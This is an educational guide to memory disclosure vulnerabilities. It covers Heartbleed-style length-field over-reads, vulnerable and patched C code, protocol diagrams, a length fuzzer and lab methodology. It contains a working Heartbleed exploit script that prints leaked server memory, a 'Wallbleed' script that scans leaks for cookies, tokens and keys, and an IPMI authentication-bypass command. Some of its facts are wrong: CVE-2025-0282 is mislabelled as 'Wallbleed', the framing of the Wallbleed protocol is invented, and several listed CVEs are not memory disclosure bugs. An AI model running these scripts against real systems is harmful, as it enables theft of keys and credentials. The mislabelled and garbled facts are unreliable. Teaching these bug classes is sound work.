# Memory Disclosure Vulnerability Guide

A practical guide for understanding Memory Disclosure vulnerabilities—where attacker-controlled length fields or missing bounds checks cause programs to read beyond intended buffer boundaries, leaking sensitive data like keys, tokens, and credentials.

## Table of Contents

- [Overview](#overview)
- [Vulnerability Classes](#vulnerability-classes)
- [Understanding Length-Field Attacks](#understanding-length-field-attacks)
  - [Heartbleed Deep Dive](#heartbleed-deep-dive-cve-2014-0160)
  - [Wallbleed Deep Dive](#wallbleed-deep-dive-cve-2025-0282)
  - [Pattern Recognition: Where Else to Look](#pattern-recognition-where-else-to-look)
- [Attack Surfaces](#attack-surfaces)
  - [Custom Protocol Parsers](#custom-protocol-parsers)
  - [Web Application Backends](#web-application-backends)
  - [Network Management Interfaces](#network-management-interfaces)
  - [Service Discovery Protocols](#service-discovery-protocols)
  - [Cloud Connectors & Remote Management Agents](#cloud-connectors--remote-management-agents)
  - [Cryptographic Implementations](#cryptographic-implementations)
  - [File Format Parsers](#file-format-parsers)
  - [Kernel & Driver Attack Surface](#kernel--driver-attack-surface)
- [Target Categories](#target-categories)
- [Cross-Cutting Research Strategy](#cross-cutting-research-strategy)
- [Lab Setup & Methodology](#lab-setup--methodology)
- [Tools Reference](#tools-reference)
- [Legal & Ethical Considerations](#legal--ethical-considerations)

---

## Overview

Memory disclosure vulnerabilities allow attackers to read memory contents beyond intended boundaries, potentially exposing credentials, cryptographic keys, session tokens, and sensitive data. These bugs span all software categories—from enterprise VPN appliances to desktop applications to cloud services.

### Foundational Examples

| CVE | Product | Category | Impact |
|-----|---------|----------|--------|
| CVE-2014-0160 (Heartbleed) | OpenSSL | Library | Private keys, session tokens via TLS heartbeat |
| CVE-2025-0282 (Wallbleed) | Ivanti Connect Secure | Enterprise VPN | Unauthenticated memory disclosure |
| CVE-2021-21972 | VMware vCenter | Virtualization | RCE via file upload, memory corruption |
| CVE-2023-23397 | Microsoft Outlook | Desktop Software | NTLM hash leak via calendar invite |
| CVE-2024-3094 | XZ Utils | Supply Chain | Backdoor in compression library |

### Why These Bugs Keep Recurring

Vendors repeat the same implementation mistakes because:

- **Code reuse** — Vulnerable libraries and SDKs propagate across products
- **Time pressure** — Security review is skipped for release deadlines
- **Legacy maintenance** — Old codebases accumulate technical debt
- **Complexity** — Modern protocols are difficult to implement correctly
- **Supply chain depth** — Dependencies inherit upstream vulnerabilities

---

## Vulnerability Classes

Memory disclosure is specifically about **reading beyond intended boundaries**. The core classes are:

### Memory Safety Issues (Core Focus)

| CWE | Name | Description | Example |
|-----|------|-------------|---------|
| CWE-125 | Out-of-bounds Read | Reading beyond buffer boundary | Heartbleed |
| CWE-787 | Out-of-bounds Write | Writing beyond buffer boundary | Stack/heap overflows |
| CWE-416 | Use After Free | Accessing freed memory | Browser exploits |
| CWE-415 | Double Free | Freeing memory twice | Heap corruption |
| CWE-122 | Heap-based Buffer Overflow | Overflow in heap memory | Many RCE chains |
| CWE-121 | Stack-based Buffer Overflow | Overflow in stack memory | Classic exploitation |
| CWE-190 | Integer Overflow | Arithmetic overflow leading to small allocation | Allocation + copy bugs |

### Related but Distinct Patterns

The following vulnerability classes are often *discovered alongside* memory disclosure, but represent fundamentally different patterns covered in separate guides:

| Pattern | Why It's Different | See Guide |
|---------|-------------------|-----------|
| Command Injection | Input → Shell execution, not memory leakage | - |
| Path Traversal | File access control, not buffer overread | Canonicalization |
| SQL Injection | Query manipulation, different trust boundary | - |
| Format String | Can cause disclosure, but via printf specifiers not length fields | - |
| IDOR | Authorization failure, not memory boundary failure | Reference Confusion |

---

## Understanding Length-Field Attacks

The core pattern behind Heartbleed, Wallbleed, and similar vulnerabilities is deceptively simple: **the attacker controls a length field, and the server trusts it without validation**. Understanding this at the byte level helps you recognize the same pattern in other protocols.

### The Fundamental Bug Pattern

```
ATTACKER SENDS:
┌─────────────────┬─────────────────┬─────────────────┐
│  Data (small)   │  Length Field   │  (claims large) │
│    4 bytes      │    says 64KB    │                 │
└─────────────────┴─────────────────┴─────────────────┘

SERVER RESPONDS:
┌─────────────────┬─────────────────────────────────────────────┐
│  Original 4     │  + 65,532 bytes of adjacent memory          │
│  bytes echoed   │  (may contain keys, passwords, tokens)      │
└─────────────────┴─────────────────────────────────────────────┘
```

The server allocates a response buffer based on the attacker's length field, then copies data starting from the small payload but continuing for the full claimed length—reading whatever happens to be in adjacent memory.

---

### Heartbleed Deep Dive (CVE-2014-0160)

Heartbleed exploited the TLS Heartbeat extension (RFC 6520), designed to keep connections alive by echoing back data.

#### Normal Heartbeat Operation

```
CLIENT HEARTBEAT REQUEST:
┌──────┬──────┬────────┬─────────────────────────────┐
│ Type │ Len  │ Payload│        Padding              │
│ 0x01 │00 05 │ HELLO  │ (random padding bytes)      │
│1 byte│2 byte│ 5 bytes│                             │
└──────┴──────┴────────┴─────────────────────────────┘

Type: 0x01 = heartbeat_request
Length: 0x0005 = 5 bytes
Payload: "HELLO" (5 bytes, matches length field)

SERVER HEARTBEAT RESPONSE:
┌──────┬──────┬────────┬─────────────────────────────┐
│ Type │ Len  │ Payload│        Padding              │
│ 0x02 │00 05 │ HELLO  │ (random padding bytes)      │
└──────┴──────┴────────┴─────────────────────────────┘

Server echoes back the payload with same length. Working as intended.
```

#### Malicious Heartbleed Request

```
MALICIOUS HEARTBEAT REQUEST:
┌──────┬──────┬────────┐
│ Type │ Len  │ Payload│
│ 0x01 │FF FF │ X      │
│1 byte│2 byte│ 1 byte │
└──────┴──────┴────────┘

Type: 0x01 = heartbeat_request  
Length: 0xFFFF = 65,535 bytes (LIES - actual payload is 1 byte)
Payload: "X" (just 1 byte)

SERVER RESPONSE (VULNERABLE):
┌──────┬──────┬────────┬──────────────────────────────────────────┐
│ Type │ Len  │ Payload│           LEAKED MEMORY                  │
│ 0x02 │FF FF │ X      │ [private keys, session data, passwords]  │
│1 byte│2 byte│ 1 byte │ ...65,534 bytes of heap memory...        │
└──────┴──────┴────────┴──────────────────────────────────────────┘
```

#### The Vulnerable Code

```c
/* OpenSSL ssl/d1_both.c - VULNERABLE VERSION */

int dtls1_process_heartbeat(SSL *s) {
    unsigned char *p = &s->s3->rrec.data[0], *pl;
    unsigned short hbtype;
    unsigned int payload;
    
    /* Read heartbeat type */
    hbtype = *p++;
    
    /* Read payload length from attacker-controlled data */
    n2s(p, payload);  // <-- TRUSTS THE LENGTH FIELD!
    pl = p;
    
    /* ... no validation that payload <= actual data received ... */
    
    /* Allocate response buffer based on attacker's length */
    buffer = OPENSSL_malloc(1 + 2 + payload + padding);
    bp = buffer;
    
    /* Build response */
    *bp++ = TLS1_HB_RESPONSE;
    s2n(payload, bp);
    
    /* Copy 'payload' bytes starting from pl */
    memcpy(bp, pl, payload);  // <-- READS BEYOND BUFFER!
    
    /* ... send response ... */
}
```

#### The Fix

```c
/* PATCHED VERSION - Added bounds checking */

int dtls1_process_heartbeat(SSL *s) {
    unsigned char *p = &s->s3->rrec.data[0], *pl;
    unsigned short hbtype;
    unsigned int payload;
    unsigned int padding = 16;
    
    /* Check minimum length for heartbeat record */
    if (s->s3->rrec.length < 1 + 2 + 16) {  // <-- NEW CHECK
        return 0;  /* Silently discard */
    }
    
    hbtype = *p++;
    n2s(p, payload);
    pl = p;
    
    /* CRITICAL FIX: Validate payload length against actual record */
    if (1 + 2 + payload + 16 > s->s3->rrec.length) {  // <-- NEW CHECK
        return 0;  /* Silently discard malformed request */
    }
    
    /* ... rest of function ... */
}
```

#### Heartbleed Proof of Concept

```python
#!/usr/bin/env python3
"""
Heartbleed (CVE-2014-0160) - Simplified demonstration
For educational purposes only - test only on systems you own
"""

import socket
import struct

def build_heartbleed_request():
    """
    Build a malicious TLS heartbeat request.
    Claims 16KB payload but sends only 1 byte.
    """
    
    # TLS record header
    content_type = b'\x18'      # Heartbeat (24)
    version = b'\x03\x02'       # TLS 1.1
    
    # Heartbeat payload
    heartbeat_type = b'\x01'    # heartbeat_request
    payload_length = b'\x40\x00' # 16384 bytes (0x4000) - THE LIE
    actual_payload = b'X'        # Only 1 byte actually sent
    
    heartbeat = heartbeat_type + payload_length + actual_payload
    
    # Complete TLS record
    record_length = struct.pack('>H', len(heartbeat))
    return content_type + version + record_length + heartbeat


def build_client_hello():
    """Build minimal TLS ClientHello to establish handshake."""
    return bytes.fromhex(
        '16'            # Content type: Handshake
        '0301'          # Version: TLS 1.0
        '00dc'          # Length
        '01'            # Handshake type: ClientHello
        '0000d8'        # Handshake length
        '0301'          # Client version: TLS 1.0
        '53435b90'      # GMT Unix time
        '9d9b720bbc0cbc2b92a84897cfbd3904'  # Random bytes
        'cc160a8503909f770433d4de2163'      # Random bytes
        '00'            # Session ID length: 0
        '0066'          # Cipher suites length
        'c014c00ac022c0210039003800880087'
        'c00fc00500350084c012c008c01cc01b'
        '00160013c00dc003000ac013c009c01f'
        'c01e00330032009a009900450044c00e'
        'c004002f009600410007c011c007c00c'
        'c002000500040100'
        '01'            # Compression methods length: 1
        '00'            # Compression method: null
        '0049'          # Extensions length
        '000b000403000102'
        '000a001c001a00170019001c001b0018'
        '001a00160017000f0013001400110012'
        '0023'          # Session ticket
        '0000'          # Length: 0
        '000f'          # Heartbeat extension
        '0001'          # Length: 1
        '01'            # Peer allowed to send heartbeats
    )


def heartbleed_test(host, port=443):
    """
    Test for Heartbleed vulnerability.
    Returns leaked memory if vulnerable.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((host, port))
        sock.send(build_client_hello())
        response = sock.recv(4096)
        if not response:
            return None, "No response to ClientHello"
        
        sock.send(build_heartbleed_request())
        response = sock.recv(65535)
        
        if len(response) > 100:
            return response, "VULNERABLE - Received {} bytes".format(len(response))
        else:
            return None, "Not vulnerable (or heartbeat disabled)"
            
    except Exception as e:
        return None, str(e)
    finally:
        sock.close()


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("Usage: {} <host>".format(sys.argv[0]))
        sys.exit(1)
    
    leaked, status = heartbleed_test(sys.argv[1])
    print(status)
    
    if leaked:
        print("\nLeaked memory (first 256 bytes):")
        for i in range(0, min(256, len(leaked)), 16):
            hex_part = ' '.join('{:02x}'.format(b) for b in leaked[i:i+16])
            ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in leaked[i:i+16])
            print('{:04x}  {:48}  {}'.format(i, hex_part, ascii_part))
```

---

### Wallbleed Deep Dive (CVE-2025-0282)

Wallbleed affects Ivanti Connect Secure VPN appliances. The vulnerability exists in how the appliance processes IF-T (Ivanti's tunneling protocol) packets, specifically in DNS-related functionality.

#### The Vulnerability Mechanism

Ivanti's IF-T protocol uses a TLV (Type-Length-Value) structure. One component processes internal DNS requests where a length byte can be manipulated:

```
NORMAL DNS TLV IN IF-T PACKET:
┌─────────┬─────────┬────────────────────────┐
│  Type   │  Length │         Value          │
│  0x01   │   0x0B  │ example.com            │
│ 1 byte  │  1 byte │ 11 bytes (matches len) │
└─────────┴─────────┴────────────────────────┘

DNS name encoding for "example.com":
┌─────┬─────────┬─────┬─────┬─────┐
│ 0x07│ example │ 0x03│ com │ 0x00│
│ len │ 7 chars │ len │ 3ch │ end │
└─────┴─────────┴─────┴─────┴─────┘

The 0x07 means "next 7 bytes are a label"
The 0x03 means "next 3 bytes are a label"  
The 0x00 terminates the name
```

#### Malicious Wallbleed Request

```
MALICIOUS IF-T DNS REQUEST:
┌─────┬───────────────────────────────────────┐
│ 0xFF│ (claims 255 bytes follow)             │
│ len │                                       │
└─────┴───────────────────────────────────────┘

Attacker changes the first length byte from a small value (like 0x03 
for "com") to 0xFF (255). The parser then reads 255 bytes starting 
from that position, leaking ~255 bytes of heap memory.

VISUAL COMPARISON:

Normal:     03 63 6f 6d 00        = .com(null)
            ^^ length=3, reads "com" correctly

Malicious:  FF 63 6f 6d 00 [...]  = reads 255 bytes
            ^^ length=255, reads way past "com" into heap
```

#### Memory Layout During Attack

```
                    HEAP MEMORY
┌──────────────────────────────────────────────────────────┐
│  IF-T Packet Buffer                                      │
│  ┌─────────────────────────────────────────────────┐     │
│  │ ... │ 0xFF │ c │ o │ m │ 0x00 │ (buffer ends)  │     │
│  └─────────────────────────────────────────────────┘     │
│                    │                                      │
│                    └──── Parser reads from here           │
│                                                          │
│  Adjacent Memory (leaked data)                           │
│  ┌─────────────────────────────────────────────────┐     │
│  │ Session tokens │ Auth cookies │ Private keys   │     │
│  │ VPN credentials│ User data    │ Internal IPs   │     │
│  └─────────────────────────────────────────────────┘     │
│                                                          │
└──────────────────────────────────────────────────────────┘

The 0xFF length byte causes the parser to read 255 bytes,
continuing past the packet buffer into adjacent heap objects.
```

#### Wallbleed Proof of Concept

```python
#!/usr/bin/env python3
"""
Wallbleed (CVE-2025-0282) - Conceptual demonstration
For educational purposes only - test only on systems you own

Note: Real exploitation requires proper IF-T protocol framing.
This shows the core concept of the length field manipulation.
"""

import socket
import ssl
import struct

def build_ift_header(msg_type, msg_length):
    """Build IF-T message header."""
    magic = b'\x00\x00\x00\x00'
    version = struct.pack('>H', 1)
    mtype = struct.pack('>H', msg_type)
    mlen = struct.pack('>I', msg_length)
    return magic + version + mtype + mlen


def build_malicious_dns_request():
    """
    Build malicious IF-T packet with oversized DNS length field.
    
    Normal DNS label:  0x03 "com" = 4 bytes total
    Malicious label:   0xFF "com" = claims 255 bytes, leaks memory
    """
    malicious_dns_name = bytes([
        0xFF,                           # MALICIOUS: Claims 255 bytes follow
        0x65, 0x78, 0x61, 0x6d,        # "exam" (only 4 bytes here)
        0x00                            # Null terminator
    ])
    
    ift_dns_type = 0x0A
    payload = malicious_dns_name
    header = build_ift_header(ift_dns_type, len(payload))
    return header + payload


def wallbleed_test(host, port=443):
    """Test for Wallbleed vulnerability."""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((host, port))
        tls_sock = context.wrap_socket(sock, server_hostname=host)
        
        handshake = build_ift_header(0x01, 0)
        tls_sock.send(handshake)
        response = tls_sock.recv(4096)
        
        malicious = build_malicious_dns_request()
        tls_sock.send(malicious)
        response = tls_sock.recv(65535)
        
        if len(response) > 100:
            return response, "Potential memory leak - {} bytes".format(len(response))
        else:
            return None, "Normal response"
            
    except Exception as e:
        return None, str(e)
    finally:
        sock.close()


def analyze_leak(data):
    """Look for interesting patterns in leaked memory."""
    findings = []
    
    if b'DSID=' in data or b'DSSignInURL' in data:
        findings.append("Potential session cookie found")
    
    import re
    ips = re.findall(rb'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', data)
    if ips:
        findings.append(f"IP addresses found: {ips[:5]}")
    
    if b'Bearer ' in data or b'token' in data.lower():
        findings.append("Potential auth tokens found")
    
    if b'PRIVATE KEY' in data:
        findings.append("CRITICAL: Private key material found")
    
    return findings
```

---

### Pattern Recognition: Where Else to Look

The pattern is always: **attacker-controlled length field → server trusts it → reads/writes beyond intended boundary**.

#### Length Field Locations by Protocol

```
PROTOCOL           LENGTH FIELD LOCATION           ATTACK SURFACE
─────────────────────────────────────────────────────────────────
TLS Heartbeat      2 bytes after type byte         Memory read (Heartbleed)
DNS labels         1 byte before each label        Memory read (Wallbleed-style)
HTTP/1.1           Content-Length header           Request smuggling, overflow
HTTP/2             Frame length (3 bytes)          Parser confusion
MQTT               Remaining Length (variable)     Memory corruption
CoAP               Payload length in header        Memory read
Modbus             Byte count field                Industrial system attacks
SNMP               ASN.1 length encoding           Multiple overflow CVEs
BGP                Message length (2 bytes)        Router crashes, RCE
RADIUS             Attribute length field          Memory disclosure
LDAP               BER-encoded lengths             Authentication bypass
SMB                Various length fields           EternalBlue-style attacks
NFS                XDR-encoded lengths             Memory corruption
iSCSI              Data segment length             Storage system attacks
```

#### Example: MQTT Protocol Length Field Attack

```
MQTT FIXED HEADER:
┌────────────┬─────────────────────────┐
│ Packet Type│ Remaining Length        │
│  4 bits    │ 1-4 bytes (variable)    │
└────────────┴─────────────────────────┘

VARIABLE LENGTH ENCODING:
Byte 1: If bit 7 is set, more bytes follow
... up to 4 bytes total

NORMAL PUBLISH PACKET:
┌──────┬──────┬─────────────────────────────┐
│ 0x30 │ 0x0C │ Topic + Payload (12 bytes)  │
│ type │ len  │                             │
└──────┴──────┴─────────────────────────────┘

MALICIOUS PACKET (if parser is vulnerable):
┌──────┬──────────────┬──────────┐
│ 0x30 │ 0xFF 0xFF    │ (2 bytes)│
│ type │ 0xFF 0x7F    │ of data  │
└──────┴──────────────┴──────────┘

Length claims 268,435,455 bytes (max MQTT length)
Actual data is only 2 bytes
Vulnerable parser allocates huge buffer or reads heap
```

#### Example: HTTP Content-Length Attack

```
NORMAL HTTP REQUEST:
POST /api/data HTTP/1.1
Host: target.com
Content-Length: 13

{"key":"val"}

Server reads exactly 13 bytes as body.


MALICIOUS REQUEST (for smuggling/overflow):
POST /api/data HTTP/1.1
Host: target.com  
Content-Length: 1000000

{"key":"val"}

Server expects 1,000,000 bytes but only ~13 sent.
Depending on implementation:
- May read from next request (request smuggling)
- May read uninitialized memory into log files
- May cause denial of service waiting for data
```

#### Example: SNMP ASN.1 Length Field Attack

```
ASN.1 LENGTH ENCODING:
- Short form: 1 byte, value 0-127
- Long form: First byte = 0x80 + number of length bytes

NORMAL SNMP GetRequest:
30 29          SEQUENCE, length 41
   02 01 00   INTEGER (version) = 0
   04 06 public  OCTET STRING (community) = "public"
   ...

MALICIOUS SNMP PACKET:
30 84 FF FF FF FF    SEQUENCE, claims length 4,294,967,295
   02 01 00          INTEGER (version) = 0
   ...

Some parsers will:
- Allocate 4GB buffer (DoS)
- Integer overflow to small allocation, then overflow on copy
- Read heap memory trying to parse "remaining" data
```

#### Vulnerable Code Patterns to Search For

```c
/* VULNERABLE PATTERN 1: Direct trust of length field */
void process_packet(char *data, int total_len) {
    uint16_t payload_len = *(uint16_t*)(data + OFFSET);  // Attacker controls
    char *response = malloc(payload_len);                 // Allocates based on lie
    memcpy(response, data + HEADER_SIZE, payload_len);   // Reads beyond buffer
}

/* VULNERABLE PATTERN 2: Integer overflow in allocation */
void process_data(char *data) {
    uint32_t count = *(uint32_t*)data;
    uint32_t elem_size = 8;
    char *buf = malloc(count * elem_size);  // Overflow: 0x20000001 * 8 = 8
    for (int i = 0; i < count; i++) {
        memcpy(buf + i*elem_size, data + 4 + i*elem_size, elem_size);
    }
}

/* VULNERABLE PATTERN 3: Signed/unsigned confusion */
void read_message(int sock) {
    int16_t len;
    recv(sock, &len, 2, 0);
    if (len > MAX_SIZE) return;  // Bypassed if len is negative!
    char buf[4096];
    recv(sock, buf, len, 0);     // Negative cast to huge unsigned
}

/* SAFE PATTERN: Proper bounds checking */
void process_packet_safe(char *data, int total_len) {
    if (total_len < HEADER_SIZE) return;
    
    uint16_t payload_len = *(uint16_t*)(data + OFFSET);
    
    // Validate claimed length against actual data
    if (payload_len > total_len - HEADER_SIZE) return;  // CRITICAL CHECK
    
    char *response = malloc(payload_len);
    if (!response) return;
    
    memcpy(response, data + HEADER_SIZE, payload_len);
}
```

#### Fuzzing Strategy for Length Fields

```python
#!/usr/bin/env python3
"""Generic length field fuzzer"""

import struct

LENGTH_FUZZ_VALUES = [
    0,                    # Zero length
    1,                    # Off-by-one
    0x7F,                 # Max signed byte
    0x80,                 # Min negative signed byte
    0xFF,                 # Max unsigned byte
    0x7FFF,               # Max signed short
    0x8000,               # Negative signed short
    0xFFFF,               # Max unsigned short  
    0x7FFFFFFF,           # Max signed int
    0x80000000,           # Min negative signed int
    0xFFFFFFFF,           # Max unsigned int
    0x100,                # Just over byte boundary
    0x10000,              # Just over short boundary
    0x20000001,           # * 8 = 8 (overflow)
    0x40000001,           # * 4 = 4
]

def generate_length_mutations(base_packet, length_offset, length_size):
    """Generate mutations for a length field at given offset."""
    for fuzz_val in LENGTH_FUZZ_VALUES:
        if length_size == 1 and fuzz_val > 0xFF:
            continue
        if length_size == 2 and fuzz_val > 0xFFFF:
            continue
            
        mutated = bytearray(base_packet)
        
        if length_size == 1:
            mutated[length_offset] = fuzz_val & 0xFF
        elif length_size == 2:
            mutated[length_offset:length_offset+2] = struct.pack('>H', fuzz_val & 0xFFFF)
        elif length_size == 4:
            mutated[length_offset:length_offset+4] = struct.pack('>I', fuzz_val)
        
        yield bytes(mutated), fuzz_val
```

---

## Attack Surfaces

### Custom Protocol Parsers

#### Why Bugs Recur Here

- Developers implement parsing manually instead of using proven libraries
- Length fields are trusted without validation
- Signed/unsigned integer confusion
- State machine edge cases aren't tested

#### Target Protocols & Products

**Enterprise & Network**
- VPN protocols: SSL-VPN (Fortinet, Palo Alto, Cisco, Ivanti), IPsec IKE
- Authentication: RADIUS, TACACS+, LDAP, Kerberos
- Email: SMTP, IMAP, POP3 servers and clients

**Application Layer**
- Database protocols: MySQL, PostgreSQL, MSSQL wire protocols
- Message queues: AMQP, MQTT, Redis protocol, Kafka
- RPC frameworks: gRPC, Thrift, custom binary protocols

**Industrial & Embedded**
- Industrial: Modbus TCP, EtherNet/IP, BACnet, DNP3, OPC-UA
- Automotive: CAN bus, UDS diagnostic protocol
- Multimedia: RTSP, RTP, SIP/VoIP

#### Historical Recurrence Examples

| CVE | Product | Pattern |
|-----|---------|---------|
| CVE-2014-0160 | OpenSSL | Length field over-read (Heartbleed) |
| CVE-2025-0282 | Ivanti Connect Secure | Same pattern (Wallbleed) |
| CVE-2022-42475 | FortiOS SSL-VPN | Heap overflow in parser |
| CVE-2023-27997 | FortiOS SSL-VPN | Heap overflow, same component |
| CVE-2020-0601 | Windows CryptoAPI | ECC parameter validation |

---

### Web Application Backends

---

### Web Application Backends

#### Memory Disclosure in Web Contexts

Web applications can suffer from memory disclosure through:

| Pattern | Description | Example |
|---------|-------------|---------|
| Buffer overread in CGI | Native code parses request, trusts length field | Custom C parsers |
| Out-of-bounds in image/PDF | Backend processes uploaded file, trusts metadata | ImageMagick, Ghostscript |
| Memory leak in response | Debug data, uninitialized memory in reply | Custom frameworks |

*Note: Command injection, SQL injection, and path traversal are distinct patterns with different root causes. See their respective guides.*

---

### Network Management Interfaces

#### SNMP Vulnerabilities

```
SNMP uses ASN.1 BER encoding. OIDs can be deeply nested.

MALICIOUS REQUEST (deeply nested OID):
06 82 FF FF              OID tag with length 65535
   [65535 bytes of data]

Effects:
- Stack overflow from recursive decoding
- Heap overflow when copying
```

| CVE | Product | Pattern |
|-----|---------|---------|
| CVE-2017-6736-6744 | Cisco IOS | Multiple SNMP overflows |
| CVE-2022-20924 | Cisco IOS XE | SNMP crash |
| StringBleed (2017) | Multiple | Auth bypass |

#### IPMI Vulnerabilities

```
IPMI CIPHER 0 (Authentication Bypass):
IPMI 2.0 supports "Cipher 0" = no authentication.
Many BMCs have this enabled by default.

Test: ipmitool -I lanplus -C 0 -H <target> -U admin chassis status


IPMI HASH DISCLOSURE (RAKP):
1. Send RAKP Message 1 with username
2. BMC responds with HMAC-SHA1 hash of password
3. Crack offline - no auth required to get hash
```

---

### Service Discovery Protocols

#### UPnP/SSDP Memory Disclosure

```
SSDP STACK OVERFLOW (Length Field Pattern):
M-SEARCH * HTTP/1.1
ST: [10000 bytes of data]

Vulnerable parsers use fixed-size buffers for the ST field.
If they trust the incoming length or don't bound the read,
adjacent stack memory is overwritten or disclosed.
```

*Note: Command injection via SOAP is a separate vulnerability class.*

---

### File Format Parsers

#### Example: Image Parser Integer Overflow

```
PNG IHDR CHUNK:
Width: 0x40000001 (1073741825)
Height: 1
bytes_per_pixel: 4

Calculation: 0x40000001 * 1 * 4 = 0x100000004
Truncated to 32-bit: 0x00000004 (4 bytes allocated!)

Parser writes 4GB into 4-byte buffer.
```

#### Example: ZIP Parsing Integer Overflow

```
ZIP Local File Header contains compressed/uncompressed sizes.

If uncompressed_size is crafted:
uncompressed_size: 0x00000010 (16 bytes)
actual_data: 64KB

Decompressor allocates 16 bytes, writes 64KB.
Result: Heap overflow (memory corruption, potential disclosure).
```

*Note: Zip Slip (path traversal during extraction) is a canonicalization bug, not memory disclosure.*

---

### Kernel & Driver Attack Surface

#### Example: IOCTL Handler Overflow

```c
NTSTATUS DeviceIoControl(PIRP Irp) {
    PVOID input = Irp->AssociatedIrp.SystemBuffer;
    ULONG input_len = stack->Parameters.DeviceIoControl.InputBufferLength;
    
    MY_STRUCT data;
    memcpy(&data, input, input_len);  // No size check = overflow
}
```

---

## Target Categories

### Enterprise Infrastructure

| Category | Products | Common Bugs |
|----------|----------|-------------|
| Virtualization | VMware, Proxmox | Web UI auth bypass |
| Backup | Veeam, Commvault | Deserialization |
| Monitoring | Nagios, Zabbix | SQL injection |

### Network & Security Appliances

| Category | Products | Common Bugs |
|----------|----------|-------------|
| Firewalls | Fortinet, Palo Alto | SSL-VPN parser bugs |
| Load Balancers | F5, Citrix | Request smuggling |
| VPN | Ivanti, Cisco | Protocol parser overflows |

### Embedded Systems & IoT

| Category | Products | Common Bugs |
|----------|----------|-------------|
| Routers | D-Link, Netgear | CGI command injection |
| Cameras | Hikvision, Dahua | Buffer overflow |
| NAS | QNAP, Synology | Command injection |

---

## Cross-Cutting Research Strategy

### By Vulnerability Genealogy

Find one bug, then look for the same pattern in:
- Same vendor, different product
- Same codebase/SDK, different vendor
- Same protocol, different implementation

| SDK/Component | Affected Products |
|---------------|-------------------|
| OpenSSL | Everything using TLS |
| libupnp | Routers, NAS, media devices |
| ThroughTek Kalay | IP cameras, baby monitors |
| Realtek SDK | Consumer routers |

### Practical Workflow

1. Pick a target category
2. Acquire 2-3 products from different vendors
3. Extract firmware/software
4. Identify shared components
5. Check versions against CVE databases
6. Focus manual review on custom code
7. Fuzz the differentiators

---

## Lab Setup & Methodology

### Recommended Lab Environment

```
┌─────────────────────────────────────────────────────────────┐
│                     ISOLATED LAB NETWORK                     │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐          │
│  │ Analysis VM │  │ Target      │  │ Traffic     │          │
│  │ - Ghidra    │  │ Device/VM   │  │ Capture     │          │
│  │ - gdb       │  │             │  │ - Wireshark │          │
│  └─────────────┘  └─────────────┘  └─────────────┘          │
└─────────────────────────────────────────────────────────────┘
```

### Firmware Analysis Steps

```bash
# 1. Extract firmware
binwalk -e firmware.bin

# 2. Find interesting files
find . -name "*.cgi" -o -name "*.so"

# 3. Identify architecture
file ./usr/bin/httpd

# 4. Search for dangerous patterns
strings ./usr/bin/httpd | grep -E "(sprintf|strcpy|system)"
```

---

## Tools Reference

### Static Analysis
- Ghidra, IDA Pro, Binary Ninja
- strings, binwalk

### Dynamic Analysis
- gdb + gef/pwndbg
- Frida
- Wireshark, mitmproxy

### Fuzzing
- AFL++
- boofuzz
- libFuzzer

### Firmware
- binwalk, firmwalker
- EMBA, firmadyne, QEMU

---

## Legal & Ethical Considerations

### Do
- Only test systems you own or have authorization
- Follow responsible disclosure
- Document methodology

### Don't
- Access systems without authorization
- Publish exploits for unpatched vulnerabilities
- Cause denial of service to live systems

### Relevant Laws
- US: Computer Fraud and Abuse Act (CFAA)
- EU: Computer Misuse Directive
- UK: Computer Misuse Act

---

## References

- [NVD](https://nvd.nist.gov/)
- [CVE](https://cve.mitre.org/)
- [Exploit-DB](https://exploit-db.com/)
- [pwn.college](https://pwn.college/)
- [OpenSecurityTraining2](https://opensecuritytraining.info/)

---

*Document Version: 2.0*
*Last Updated: January 2025*
